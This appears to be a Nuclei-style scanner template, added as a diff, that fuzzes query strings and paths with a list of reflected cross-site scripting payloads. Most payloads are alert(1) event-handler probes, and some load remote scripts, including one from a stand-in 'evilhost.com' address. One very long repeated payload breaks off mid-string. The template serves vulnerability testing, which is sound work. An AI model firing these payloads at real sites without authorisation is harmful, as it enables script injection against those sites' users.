@@ -1,0 +1,96 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<plaintext draggable=\"true\" ondragend=\"alert(1)\">test</plaintext>"
+        - "<script>alert(1)</script><input autofocus>"
+        - "<pre><script>\\xE2\\x80\\x9B\\EC7\\EF0A</script></pre>"
+        - "<pre id=x tabindex=1 onbeforeactivate=alert(1)></pre>"
+        - "<template onpaste=\"alert(1)\" contenteditable>test</template>"
+        - "<form onmouseover=\"alert(1)\">test</form>"
+        - "<input id=x tabindex=1 onbeforeactivate=alert(1)></input><input id=y tabindex=2 autofocus> </input>"
+        - "<input onmouseover=\"alert(1)\">test</input><"
+        - "<tt onmouseup=\"alert(1)\">test</tt>"
+        - "<img src=1.gif>"
+        - "<xmp style=\"cursor:pointer\" oncontextmenu=\"alert(1)\">test</xmp>"
+        - "<address id=x tabindex=1 onactivate=alert(1)></address><input id=y autofocus>"
+        - "<style>:target {transform: rotate(180deg);}</style><details id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></details>"
+        - "<sup id=x tabindex=1 onblur=alert(1)></sup><input autofocus>"
+        - "<menuitem id=\"x\" onclick=alert(1)></menuitem><input id=y autofocus>"
+        - "<form onmousemove=\"alert(1)\">test</form>"
+        - "<frame id=x tabindex=1 onbeforeactivate=alert(1)>"
+        - "<picture><source srcset=\"1x.jpg\">"
+        - "<template id=x tabindex=1 onblur=alert(1)></template><input id=y autofocus>"
+        - "<IMG SRC=x onmouseover=\"alert(1)\">"
+        - "<address draggable=\"true\" ondragenter=\"alert(1)\">test</address>"
+        - "<script>alert(\"XSS\")</script>"
+        - "<form id=\"f1\" name=\"f1\" onfocusout=\"alert(1)\">test</form><input autofocus>"
+        - "<textarea draggable=\"true\" ondragleave=\"alert(1)\">test</textarea>"
+        - "<html id=x tabindex=1 onbeforeactivate=alert(1)></html><input id=y autofocus>"
+        - "<script src=\"http://example.com/somescript.js\"></script>"
+        - "<details id=x tabindex=1 onblur=alert(1)></details>"
+        - "<address draggable=\"true\" ondragend=\"alert(1)\">test</address>"
+        - "<sup id=x tabindex=1 onbeforeactivate=alert(1)></sup>"
+        - "<script src=http://www.google.com/ >"
+        - "<code onblur=alert(1) tabindex=1 id=x></code><input autofocus>"
+        - "<basefont id=x tabindex=1 onblur=alert(1)>"
+        - "<style>:target {color:red;}</style><button id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></button>"
+        - "<fieldset id=x tabindex=1 onactivate=alert(1)></fieldset><input id=y autofocus>"
+        - "<div id=x tabindex=1 onbeforeactivate=alert(1)></div><input autofocus>"
+        - "<style>:target {transform: rotate(180deg);}</style><template id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></template>"
+        - "<menuitem onkeydown=\"alert(1)\" contenteditable>test</menuitem><input onpaste=\"alert(2)\" contenteditable>test</input>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div style=\"position:absolute;\" id=x></div>"
+        - "<script>alert(1)</script>"
+        - "<font oncopy=\"alert(1)\" contenteditable>test</font>"
+        - "<fieldset style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">test</fieldset>"
+        - "<noscript onmouseover=\"alert(1)\">test</noscript>"
+        - "<textarea id=x tabindex=1 onbeforeactivate=alert(1)></textarea>"
+        - "<pre onmousedown=\"alert(1)\">test</pre><tt onclick=alert(2)></tt><font id=x tabindex=1 onbeforeactivate=alert(3)>test</font><div contenteditable>test</div><thead draggable=true ondragenter=alert(4)>test</thead><video id=y autoplay=1></video><script id=z defer>new Image().src='javascript:alert(5)'</script><a href=virus>test</a><img onload=alert(6)>test</img><iframe srcdata=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\">test</iframe><input onpaste=alert(7) contenteditable>test</input><datalist id=t onmouseup=alert(8)>test</datalist><ul id=11 tabindex=1></ul><textarea id=z draggable=true ondragenter=alert(9)>test</textarea><object id=10 contenteditable>test</object><h2 id=u onmouseup=alert(10)></h2><source id=v srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\">test</source><input type=file ondrop=alert(11)>test</input><q contenteditable>test</q><img onloadstart=alert(12)></img><slot id=w draggable=true ondragenter=alert(13)>test</slot><audio srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" autoplay>test</audio><table contenteditable>test</table><input type=file oncopy=alert(14) contenteditable>test</input><input id=x onchange=alert(15)>test</input><kbd id=y onmouseup=alert(16)>test</kbd><fieldset id=z draggable=true ondragenter=alert(17)>test</fieldset><select id=t onchange=alert(18)>test</select><h1 id=u onmouseup=alert(19)></h1><img onloadstart=\"javascript:alert(20)\">test</img><details id=v contenteditable>test</details><input type=file onpaste=alert(21) contenteditable>test</input><textarea id=x onchange=alert(22)>test</textarea><video srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" autoplay>test</video><blockquote id=y onmouseup=alert(23)></blockquote><fieldset id=z onbeforecopy=alert(24) contenteditable>test</fieldset><select id=t onchange=alert(25)>test</select><h2 id=u onmouseup=alert(26)></h2><input type=file srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" crossorigin=1>test</input><input id=x onchange=alert(27)>test</input><menuitem id=y onmouseup=alert(28)></menuitem><fieldset id=z onbeforepaste=alert(29) contenteditable>test</fieldset><select id=t onchange=alert(30)>test</select><h1 id=u onmouseup=alert(31)></h1><video srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" autoplay>test</video><input type=file onpaste=alert(32) contenteditable>test</input><textarea id=x onchange=alert(33)>test</textarea><q id=y onmouseup=alert(34)></q><fieldset id=z oncopy=alert(35) contenteditable>test</fieldset><select id=t onchange=alert(36)>test</select><h2 id=u onmouseup=alert(37)></h2><input type=file srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" crossorigin=1>test</input><input id=x onchange=alert(38)>test</input><template id=y onmouseup=alert(39)></template><fieldset id=z onpaste=alert(40) contenteditable>test</fieldset><select id=t onchange=alert(41)>test</select><h1 id=u onmouseup=alert(42)></h1><video srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" autoplay>test</video><input type=file onpaste=alert(43) contenteditable>test</input><textarea id=x onchange=alert(44)>test</textarea><ul id=y onmouseup=alert(45)></ul><fieldset id=z oncut=alert(46) contenteditable>test</fieldset><select id=t onchange=alert(47)>test</select><h2 id=u onmouseup=alert(48)></h2><input type=file srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" crossorigin=1>test</input><input id=x onchange=alert(49)>test</input><menuitem id=y onmouseup=alert(50)></menuitem><fieldset id=z oncut=alert(51) contenteditable>test</fieldset><select id=t onchange=alert(52)>test</select><h1 id=u onmouseup=alert(53)></h1><video srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" autoplay>test</video><input type=file onpaste=alert(54) contenteditable>test</input><textarea id=x onchange=alert(55)>test</textarea><blockquote id=y onmouseup=alert(56)></blockquote><fieldset id=z oncopy=alert(57) contenteditable>test</fieldset><select id=t onchange=alert(58)>test</select><h2 id=u onmouseup=alert(59)></h2><input type=file srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" crossorigin=1>test</input><input id=x onchange=alert(60)>test</input><menuitem id=y onmouseup=alert(61)></menuitem><fieldset id=z onpaste=alert(62) contenteditable>test</fieldset><select id=t onchange=alert(63)>test</select><h1 id=u onmouseup=alert(64)></h1><video srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" autoplay>test</video><input type=file onpaste=alert(65) contenteditable>test</input><textarea id=x onchange=alert(66)>test</textarea><q id=y onmouseup=alert(67)></q><fieldset id=z oncut=alert(68) contenteditable>test</fieldset><select id=t onchange=alert(69)>test</select><h2 id=u onmouseup=alert(70)></h2><input type=file srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" crossorigin=1>test</input><input id=x onchange=alert(71)>test</input><template id=y onmouseup=alert(72)></template><fieldset id=z oncut=alert(73) contenteditable>test</fieldset><select id=t onchange=alert(74)>test</select><h1 id=u onmouseup=alert(75)></h1><video srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" autoplay>test</video><input type=file onpaste=alert(76) contenteditable>test</input><textarea id=x onchange=alert(77)>test</textarea><ul id=y onmouseup=alert(78)></ul><fieldset id=z oncopy=alert(79) contenteditable>test</fieldset><select id=t onchange=alert(80)>test</select><h2 id=u onmouseup=alert(81)></h2><input type=file srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" crossorigin=1>test</input><input id=x onchange=alert(82)>test</input><menuitem id=y onmouseup=alert(83)></menuitem><fieldset id=z oncopy=alert(84) contenteditable>test</fieldset><select id=t onchange=alert(85)>test</select><h1 id=u onmouseup=alert(86)></h1><video srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" autoplay>test</video><input type=file onpaste=alert(87) contenteditable>test</input><textarea id=x onchange=alert(88)>test</textarea><blockquote id=y onmouseup=alert(89)></blockquote><fieldset id=z oncut=alert(90) contenteditable>test</fieldset><select id=t onchange=alert(91)>test</select><h2 id=u onmouseup=alert(92)></h2><input type=file srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" crossorigin=1>test</input><input id=x onchange=alert(93)>test</input><menuitem id=y onmouseup=alert(94)></menuitem><fieldset id=z oncut=alert(95) contenteditable>test</fieldset><select id=t onchange=alert(96)>test</select><h1 id=u onmouseup=alert(97)></h1><video srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" autoplay>test</video><input type=file onpaste=alert(98) contenteditable>test</input><textarea id=x onchange=alert(99)>test</textarea><q id=y onmouseup=alert(100)></q><fieldset id=z oncopy=alert(101) contenteditable>test</fieldset><select id=t onchange=alert(102)>test</select><h2 id=u onmouseup=alert(103)></h2><input type=file srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" crossorigin=1>test</input><input id=x onchange=alert(104)>test</input><template id=y onmouseup=alert(105)></template><fieldset id=z oncopy=alert(106) contenteditable>test</fieldset><select id=t onchange=alert(107)>test</select><h1 id=u onmouseup=alert(108)></h1><video srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" autoplay>test</video><input type=file onpaste=alert(109) contenteditable>test</input><textarea id=x onchange=alert(110)>test</textarea><ul id=y onmouseup=alert(111)></ul><fieldset id=z onpaste=alert(112) contenteditable>test</fieldset><select id=t onchange=alert(113)>test</select><h2 id=u onmouseup=alert(114)></h2><input type=file srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" crossorigin=1>test</input><input id=x onchange=alert(115)>test</input><menuitem id=y onmouseup=alert(116)></menuitem><fieldset id=z onpaste=alert(117) contenteditable>test</fieldset><select id=t onchange=alert(118)>test</select><h1 id=u onmouseup=alert(119)></h1><video srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" autoplay>test</video><input type=file onpaste=alert(120) contenteditable>test</input><textarea id=x onchange=alert(121)>test</textarea><blockquote id=y onmouseup=alert(122)></blockquote><fieldset id=z oncut=alert(123) contenteditable>test</fieldset><select id=t onchange=alert(124)>test</select><h2 id=u onmouseup=alert(125)></h2><input type=file srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" crossorigin=1>test</input><input id=x onchange=alert(126)>test</input><menuitem id=y onmouseup=alert(127)></menuitem><fieldset id=z oncut=alert(128) contenteditable>test</fieldset><select id=t onchange=alert(129)>test</select><h1 id=u onmouseup=alert(130)></h1><video srcset=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAAMAAAAAAC\" autoplay>test</video><input type=file onpaste=alert(131) contenteditable>test</input><textarea id=x onchange=alert(132)>test</textarea><q id=y onmouseup=alert(133)></q><fieldset id=z oncopy=alert(134) contenteditable>test</fieldset><select id=t onchange=alert(135)>test</select><h2 id=u onmouseup=alert(136)></h2><input type=file srcset=\"data:image/gif;base64,R0lG"
+        - "<script src=\"http://www.evilhost.com/evil.js\"></script>"
+        - "<style>@keyframes slidein {}</style><header style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></header>"
+        - "<video id=x tabindex=1></video><input autofocus>"
+        - "<sup style=\"position:absolute;transform:rotate(180deg);\">x</sup><input style=\"transform:translateX(-1px)\" autofocus>"
+        - "<iframe id=x tabindex=1 onfocusin=alert(1)></iframe><input autofocus>"
+        - "<style>:target {transform: rotate(180deg);}</style><pre id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></pre>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
